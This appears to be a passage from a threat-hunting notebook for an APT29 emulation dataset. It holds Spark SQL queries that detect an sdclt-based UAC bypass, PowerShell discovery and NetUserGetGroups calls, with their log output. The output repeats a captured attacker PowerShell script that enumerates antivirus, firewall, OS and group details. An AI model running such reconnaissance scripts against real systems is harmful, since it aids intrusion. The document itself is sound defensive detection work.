<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%-class firewallproduct%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:B7549913-AF53-4F9A-9C3F-4106578EA5F2</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%-class firewallproduct%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-9-permission-groups-discovery">
<h2>4.C.9. Permission Groups Discovery<a class="headerlink" href="#c-9-permission-groups-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated user’s domain group membership via the NetUserGetGroups API</p>
<p><strong>Criteria:</strong> powershell.exe executing the NetUserGetGroups API</p>
<div class="section" id="detection-type-technique-alert">
<h3>Detection Type:technique(alert)<a class="headerlink" href="#detection-type-technique-alert" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:FA458669-1C94-4150-AFFC-A3236FC6B275</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT a.EventTime, o.TargetUserName, o.IpAddress, a.Message</span>
<span class="sd">FROM apt29Host o</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT Message, EventTime, SubjectLogonId</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE lower(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4661</span>
<span class="sd">        AND ObjectType = &quot;SAM_DOMAIN&quot;</span>
<span class="sd">        AND SubjectUserName NOT LIKE &#39;%$&#39;</span>
<span class="sd">        AND AccessMask = &#39;0x20094&#39;</span>
<span class="sd">        AND LOWER(Message) LIKE &#39;%getlocalgroupmembership%&#39;</span>
<span class="sd">    ) a</span>
<span class="sd">ON o.TargetLogonId = a.SubjectLogonId</span>
<span class="sd">WHERE lower(Channel) = &quot;security&quot; </span>
<span class="sd">        AND o.EventID = 4624</span>
<span class="sd">        AND o.LogonType = 3</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 EventTime      | 2020-05-01 23:04:04                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
 TargetUserName | pbeesly                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
 IpAddress      | 10.0.1.4                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
 Message        | A handle to an object was requested.

Subject :
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x5DD594

Object:
	Object Server:	Security Account Manager
	Object Type:	SAM_DOMAIN
	Object Name:	DC=dmevals,DC=local
	Handle ID:	0x1fccecf7240

Process Information:
	Process ID:	0x2c0
	Process Name:	C:\Windows\System32\lsass.exe

Access Request Information:
	Transaction ID:	{00000000-0000-0000-0000-000000000000}
	Accesses:	READ_CONTROL
				ReadOtherParameters
				CreateUser
				GetLocalGroupMembership
				
	Access Reasons:		-
	Access Mask:	0x20094
	Privileges Used for Access Check:	-
	Properties:	---
	{19195a5a-6da0-11d0-afd3-00c04fd930c9}
READ_CONTROL
ReadOtherParameters
CreateUser
GetLocalGroupMembership
		{c7407360-20bf-11d0-a768-00aa006e0529}
			{bf9679a4-0de6-11d0-a285-00aa003049e2}
			{bf9679a5-0de6-11d0-a285-00aa003049e2}
			{bf9679a6-0de6-11d0-a285-00aa003049e2}
			{bf9679bb-0de6-11d0-a285-00aa003049e2}
			{bf9679c2-0de6-11d0-a285-00aa003049e2}
			{bf9679c3-0de6-11d0-a285-00aa003049e2}
			{bf967a09-0de6-11d0-a285-00aa003049e2}
			{bf967a0b-0de6-11d0-a285-00aa003049e2}
		{b8119fd0-04f6-4762-ab7a-4986c76b3f9a}
			{bf967a34-0de6-11d0-a285-00aa003049e2}
			{bf967a33-0de6-11d0-a285-00aa003049e2}
			{bf9679c5-0de6-11d0-a285-00aa003049e2}
			{bf967a61-0de6-11d0-a285-00aa003049e2}
			{bf967977-0de6-11d0-a285-00aa003049e2}
			{bf96795e-0de6-11d0-a285-00aa003049e2}
			{bf9679ea-0de6-11d0-a285-00aa003049e2}
		{ab721a52-1e2f-11d0-9819-00aa0040529b}

	Restricted SID Count:	0 
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="id34">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id34" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:11827B7C-8010-443C-9116-500289E0ED57</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%netusergetgroups%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:52E7DFEA-05BC-4B81-BFE9-DE6085FA8228</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%netusergetgroups%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-10-execution-through-api">
<h2>4.C.10. Execution through API<a class="headerlink" href="#c-10-execution-through-api" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Executed API call by reflectively loading Netapi32.dll</p>
<p><strong>Criteria:</strong> The NetUserGetGroups API function loaded into powershell.exe from Netapi32.dll</p>
<div class="section" id="id35">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id35" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:0B50643F-98FA-4F4A-8E22-9257D85AD7C5</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessGuid = e.ProcessGuid</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">AND f.EventID = 7</span>
<span class="sd">AND LOWER(f.ImageLoaded) LIKE &quot;%netapi32.dll&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Image loaded:
RuleName: -
UtcTime: 2020-05-02 03:04:04.361
ProcessGuid: {47ab858c-e23d-5eac-c603-000000000400}
ProcessId: 3876
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\netapi32.dll
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Net Win32 API DLL
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: NetApi32.DLL
Hashes: SHA1=7DFDD188B30162DAA87FDD3E5B7A55C80CD839F1,MD5=86A9DF3FA9D5FCAC8EF57601FCCD78F9,SHA256=F8CDA38FD3FF371E772875EA657A37662321EBB7AD8D6978DBCCCA7FC6DB64F1,IMPHASH=7D4E1695394CF47BD397AFD45A40E55D
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-11-permission-groups-discovery">
<h2>4.C.11. Permission Groups Discovery<a class="headerlink" href="#c-11-permission-groups-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated user’s local group membership via the NetUserGetLocalGroups API</p>
<p><strong>Criteria:</strong> powershell.exe executing the NetUserGetLocalGroups API</p>
<div class="section" id="id36">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id36" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:1CD16ED8-C812-40B1-B968-F0DABFC79DDF</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
